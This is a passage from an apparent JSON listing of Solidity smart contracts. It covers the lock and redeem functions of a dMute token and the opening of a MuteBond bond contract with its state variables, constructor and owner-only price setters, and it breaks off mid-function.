IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);\n\n        // calculate dTokens to mint\n        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);\n\n        require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');\n\n        _mint(to, tokens_to_mint);\n\n        _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));\n\n        emit LockEvent(to, _amount, tokens_to_mint, _lock_time);\n    }\n\n    function Redeem(uint256[] memory lock_index) public {\n        RedeemTo(lock_index, msg.sender);\n    }\n\n    function RedeemTo(uint256[] memory lock_index, address to) public nonReentrant {\n        uint256 total_to_redeem = 0;\n        uint256 total_to_burn = 0;\n\n        for(uint256 i; i < lock_index.length; i++){\n          uint256 index = lock_index[i];\n          UserLockInfo memory lock_info = _userLocks[msg.sender][index];\n\n          require(block.timestamp >= lock_info.time, \"dMute::Redeem: INSUFFICIENT_LOCK_TIME\");\n          require(lock_info.amount >= 0 , \"dMute::Redeem: INSUFFICIENT_AMOUNT\");\n          require(lock_info.tokens_minted >= 0 , \"dMute::Redeem: INSUFFICIENT_MINT_AMOUNT\");\n\n          total_to_redeem = total_to_redeem.add(lock_info.amount);\n          total_to_burn = total_to_burn.add(lock_info.tokens_minted);\n\n          _userLocks[msg.sender][index] = UserLockInfo(0,0,0);\n        }\n\n        require(total_to_redeem > 0, \"dMute::Lock: INSUFFICIENT_REDEEM_AMOUNT\");\n        require(total_to_burn > 0, \"dMute::Lock: INSUFFICIENT_BURN_AMOUNT\");\n\n\n        for(uint256 i = _userLocks[msg.sender].length; i > 0; i--){\n          UserLockInfo memory lock_info = _userLocks[msg.sender][i - 1];\n\n          // recently redeemed lock, destroy it\n          if(lock_info.time == 0){\n            _userLocks[msg.sender][i - 1] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1];\n            _userLocks[msg.sender].pop();\n          }\n        }\n\n        //redeem tokens to user\n        IERC20(MuteToken).transfer(to, total_to_redeem);\n        //burn dMute\n        _burn(msg.sender, total_to_burn);\n\n\n        emit RedeemEvent(msg.sender, total_to_redeem, total_to_burn);\n    }\n\n    function GetUserLockLength(address account) public view returns (uint256 amount) {\n        amount = _userLocks[account].length;\n    }\n\n    function GetUnderlyingTokens(address account) public view returns(uint256 amount) {\n        for(uint256 i; i < _userLocks[account].length; i++){\n          amount = amount.add(_userLocks[account][i].amount);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/bonds/MuteBond.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '../libraries/SafeMath.sol';\nimport '../libraries/TransferHelper.sol';\n\ncontract MuteBond {\n    using SafeMath for uint;\n\n    /* ======== EVENTS ======== */\n\n    event BondCreated(uint deposit, uint payout, address depositor, uint time);\n    event BondPriceChanged(uint internalPrice, uint debtRatio);\n    event MaxPriceChanged(uint _price);\n    event MaxPayoutChanged(uint _price);\n    event EpochDurationChanged(uint _payout);\n    event BondLockTimeChanged(uint _duration);\n    event StartPriceChanged(uint _lock);\n\n     /* ======== STATE VARIABLES ======== */\n\n    address immutable private muteToken; // token paid for principal\n    address immutable private dMuteToken;\n    address immutable private lpToken; // inflow token\n    ITreasury immutable private customTreasury; // pays for and receives principal\n    uint public bond_time_lock = 7 days; // length of lockup in dMute for bonds\n\n    uint public totalPayoutGiven; // total amount of mute paid\n    uint public totalDebt; // total amount of LP collected\n\n    uint public epochDuration = 7 days; // the length of an epoch from getting from startPrice  to maxPrice\n    uint public maxPrice; // max limit price for the LP token (LP:mute ratio)\n    uint public startPrice; // start price of the LP token (LP:mute ratio)\n    uint public maxPayout; // max amount of mute tokens to sell in each epoch\n    uint public epochStart; // timestamp of the current epoch start\n    uint public epoch; // amount of cycles for bonds so far\n\n    BondTerms[] public terms; // identifies the terms for a bond in a given epoch\n    Bonds[] public bonds; // stores individual deposits\n\n    // Info for bond epochs\n    struct BondTerms {\n        uint bondTotal; // amount of tokens bonded so far\n        uint payoutTotal;\n        uint lastTimestamp;\n    }\n\n    // Info for a single depositors bond info\n    struct Bonds {\n        uint value; //\n        uint payout; //\n        address depositor; //\n        uint timestamp;\n    }\n\n\n\n    /* ======== CONSTRUCTOR ======== */\n\n    /**\n     *  @notice initializes the bond\n     *  @param _customTreasury address\n     *  @param _lpToken address\n     *  @param _dmuteToken address\n     *  @param _maxPrice uint\n     *  @param _startPrice uint\n     *  @param _maxPayout uint\n     */\n    constructor(address _customTreasury, address _lpToken, address _dmuteToken,\n                uint _maxPrice, uint _startPrice, uint _maxPayout) {\n        require( _customTreasury != address(0) && _lpToken != address(0));\n        customTreasury = ITreasury( _customTreasury );\n        muteToken = ITreasury(_customTreasury).payoutToken();\n        dMuteToken = _dmuteToken;\n\n        lpToken = _lpToken;\n\n        // approve lock token to spend payout\n        TransferHelper.safeApprove(muteToken, dMuteToken, type(uint256).max);\n\n\n        require(_maxPrice >= _startPrice, \"starting price < min\");\n\n        epochStart = block.timestamp;\n        maxPrice = _maxPrice;\n        startPrice = _startPrice;\n        maxPayout = _maxPayout;\n\n        terms.push(BondTerms(0,0,0));\n    }\n\n\n    /* ======== OWNER FUNCTIONS ======== */\n\n    /**\n     *  @notice sets the max limit price for the LP token\n     *  @param _price uint\n     */\n    function setMaxPrice(uint _price) external {\n        require(msg.sender == customTreasury.owner());\n        maxPrice = _price;\n        emit MaxPriceChanged(_price);\n    }\n\n    /**\n     *  @notice sets the start price for the LP token\n     *  @param _price uint\n     */\n    function setStartPrice(uint _price) external {\n        require(msg.sender == customTreasury.owner());\n        startPrice = _price;\n        emit StartPriceChanged(_price);\n    }\n\n    /**\n     *  @notice sets the max amount of mute tokens to sell in each epoch\n     *  @param _payout uint\n     */\n    function setMaxPayout(uint _payout) external {\n        require(msg.sender == customTreasury.owner());\n        maxPayout = _payout;\n        emit MaxPayoutChanged(_payout);\n    }\n\n    /**\n     *  @notice sets the length of bond epoch\n     *  @param _duration uint\n     */\n    function setE"
    }
  ]
}